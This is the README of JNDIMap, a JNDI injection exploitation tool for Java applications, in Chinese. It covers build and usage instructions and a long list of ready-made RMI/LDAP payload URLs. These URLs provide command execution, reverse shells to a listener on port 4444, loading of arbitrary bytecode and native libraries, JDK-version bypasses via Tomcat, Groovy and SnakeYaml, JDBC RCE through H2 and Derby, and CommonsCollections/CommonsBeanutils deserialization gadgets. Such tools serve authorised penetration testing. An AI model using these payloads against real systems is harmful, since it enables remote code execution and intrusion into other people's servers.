# JNDIMap

JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多种高版本 JDK 绕过方式

目前支持以下功能

- DnsLog
- 命令执行
- 原生反弹 Shell (支持 Windows)
- 加载自定义 Class 字节码
- Tomcat/Groovy/SnakeYaml Bypass
- Commons/Tomcat DBCP, Druid JDBC RCE
- NativeLibLoader 加载动态链接库
- MLet 探测可用 Class
- LDAP 反序列化

## Compile

目前 Release 版本暂未发布, 推荐手动编译

```bash
git clone https://github.com/X1r0z/JNDIMap
cd JNDIMap
mvn package -Dmaven.test.skip=true
```

## Usage

```bash
Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-h]
````

`-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)

`-r`: RMI 服务器监听端口, 默认为 `1099`

`-l`: LDAP 服务器监听端口, 默认为 `1389`

`-p`: HTTP 服务器监听端口, 默认为 `3456`

`-h`: 显示 Usage 信息

## JNDI URL

注意传入的 Base64 均为 **Base64 URL 编码**, 即把 `+` 和 `/` 替换为 `-` 和 `_`

以下路由除 `/Deserialize/*` (LDAP 反序列化) 以外, 均支持 RMI 和 LDAP 协议

对于 RMI 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `rmi://127.0.0.1:1099/` 即可

```bash
# DnsLog
ldap://127.0.0.1:1389/Basic/DnsLog/xxx.dnslog.cn

# 命令执行
ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==

# 从字符串/服务器上的某个路径加载自定义的 Class 字节码
ldap://127.0.0.1:1389/Basic/FromCode/<base64-java-bytecode>
ldap://127.0.0.1:1389/Basic/FromPath/<base64-path-to-evil-class-file>

# 反弹 Shell (支持 Windows)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444

# 以下 Bypass 方式支持 Basic 所有功能

# Tomcat Bypass
ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator

# Groovy Bypass
ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator

# SnakeYaml Bypass
ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator

# MLet 探测可用 Gadget
# 如果 com.example.TestClass 这个类存在, 则 HTTP 服务器会接收到一个 /com/example/TestClass_exists.class 请求
ldap://127.0.0.1:1389/MLet/com.example.TestClass

# NativeLibLoader 加载动态链接库
# 需要通过其它方式在目标机器上写入一个 dll/so/dylib, 然后通过 NativeLibLoader 加载
# 注意传入的 path 为绝对路径, 且不能包含后缀名
# 例如: 服务器上存在 /tmp/evil.so, 则 path 为 /tmp/evil
ldap://127.0.0.1:1389/NativeLibLoader/<base64-path-to-native-library>

# Commons/Tomcat DBCP, Alibaba Druid JDBC RCE
# 将以下的 Factory 替换为 CommonsDbcp1, CommonsDbcp2, TomcatDbcp1, TomcatDbcp2, Druid 其中之一

# H2 RCE
# 三种方式: CREATE ALIAS/Groovy/JavaScript (ScriptEngine)
ldap://127.0.0.1:1389/Factory/H2/Alias/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator

# Derby 反序列化 RCE
# 先创建数据库
ldap://127.0.0.1:1389/Factory/Derby/Create/<database>
# 然后指定 Slave Server 的信息, database 即为上面创建的数据库名称
ldap://127.0.0.1:1389/Factory/Derby/Slave/<ip>/<port>/<database>
# JNDIMap 提供了 DerbyServer 类用于快速启动 Derby Server 并发送恶意序列化数据 (见 README 末尾)

# 自定义数据 反序列化
ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>

# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444

# CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator

# CommonsCollectionsK3 反序列化 (3.1 + Runtime.exec), 仅支持命令执行
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==

# CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator

# CommonsBeanutils1NoCC 反序列化 (1.9.4, 无需 commons-collections 依赖), 使用 TemplatesImpl, 支持命令执行和反弹 Shell
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4444
```

## Server

快速启动 Derby Server, 用于配合 Derby 反序列化 RCE

```bash
Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]
```

`-p`: Derby Server 监听端口, 默认为 `4851`

`-g`: 指定 Gadget, 如 `/CommonsCollectionsK1/Command/open -a Calculator` (即上面以 `/Deserialize/` 开头的路由)

`-f`: 指定自定义序列化数据文件

`-h`: 显示 Usage 信息